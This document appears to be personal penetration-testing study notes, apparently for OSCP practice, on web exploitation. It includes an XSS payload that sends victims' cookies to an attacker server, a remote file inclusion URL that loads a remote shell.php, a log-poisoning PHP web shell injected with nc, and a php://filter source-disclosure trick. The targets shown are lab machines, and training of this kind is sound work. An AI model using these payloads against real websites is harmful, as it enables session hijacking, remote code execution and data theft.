Website Exploit

# XSS

## Reverse Shell

## Using Beef

Beef

\*\*Note: \*\*XSS only works if an authenticated user accesses the webpage

# Steal Cookie Session

Cookies have two optional flags of interest to pentesters: Secure and HttpOnly

<ins>**Secure flag**</ins> \-\-\- instructs browser to only send the cookie over encrypted connections. This protects cookie from being sent in cleartext and captured over the network

- Make sure the website is not using HTTPS

<ins>**HttpOnly**</ins> \-\-\- instructs browser to deny JS access to the cookie. If the flag is not set, we can use an XSS payload to steal the cookie.

- If HTTPOnly is set, we can try to use cookie jar overflow
- ![b7757caf5e1a534ff942c14219c18e0f.png](:/d74f9f4349a046bbb52b0e421c07954d)
- In Firefox console, the cookie did not overflow and got removed; instead we manually deleted the cookie and allowed the browser to overwrite. We can also manually edit the cookie; however, this will not work unless we programme it to
- We can do a for-loop, then

First, use an XSS script if HttpOnly is not set

> &lt;script&gt;new Image().src=’[http://10.11.0.4/hijacker.php?cookie=’+document.cookie;](http://10.11.0.4/hijacker.php?cookie=%E2%80%99+document.cookie;)&lt;/script&gt;

When we have our web server open, we will see the user accessing, and the Session ID generated

Use Cookie-Editor to access the webpage

# File Inclusion Vulnerabilities

Check values of register\_globals, allow\_url wrappers.

- In [version](https://www.plus2net.com/php_tutorial/php-version.php) PHP 5 and above by default, *register_global* is kept OFF.
- If allow\_url\_include or allow\_url\_fopen is enabled, proceed to do RFI

If have access to source code, check for **include** and code that are poorly design e.g.

- $file = $_GET\['page'\];

Make sure to look out for parameters that are linked to files (signs of file inclusion)

![28d96990055803bbc316ed7557f0ea00.png](:/a43d4d1f5d3b4e1a9802a632d5ca66e3)

> 192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php #For RFI

Sometimes, the LFI is in the Request sent. Example shown is from OSCP machine we did

<img src=":/9c71d821603843889d4313b4d820bcb2" alt="1e1c6c65502bd520d973599be7b3ac72.png" width="851" height="514" class="jop-noMdConv">

Sometimes during a Local File Inclusion, the web server appends ‘.php’ to the included file. For example, including ‘/etc/passwd’ gets rendered as ‘/etc/passwd.php’. This occurs when the include function uses a parameter like *?page* and concatenates the .php extension to the file. In versions of PHP below 5.3, ending the URL with a null byte (%00) would cause the interpreter to stop reading, which would allow the attacker to include their intended page.

# Log File Poisoning

Logs to look into trying - https://www.thegeekstuff.com/2011/08/linux-var-log-files/

FTP - /var/log/**vsftp.d**

SSH, login info - /var/log/**auth.log**

HTTP - On windows if xampp, C:\\xampp\\apache\\logs\\access.log; On Linux, /var/log/apache2/access.log

> nc 192.168.1.102 80
> 
> &lt;?php echo 'pre&gt;' . shell\_exec($\_GET\['cmd'\]) . '&lt;/pre&gt;';?>
> 
> \# To access log

After writing to the log file, run the file

> http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id

# Bypassing php-execution

So if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.

> http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index 

Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:

> base64 -d savefile.php

id: 1094d9f035074e3a8ef344a61a88cf5e
parent_id: 8e7bd5349cf3494986eccd0619b576c9
created_time: 2022-01-25T01:48:20.761Z
updated_time: 2022-01-25T16:46:37.710Z
is_conflict: 0
latitude: 0.00000000
longitude: 0.00000000
altitude: 0.0000
author: 
source_url: 
is_todo: 0
todo_due: 0
todo_completed: 0
source: joplin-desktop
source_application: net.cozic.joplin-desktop
application_data: 
order: 0
user_created_time: 2022-01-25T01:48:20.761Z
user_updated_time: 2022-01-25T16:46:37.710Z
encryption_cipher_text: 
encryption_applied: 0
markup_language: 1
is_shared: 0
share_id: 
conflict_original_id: 
master_key_id: 
type_: 1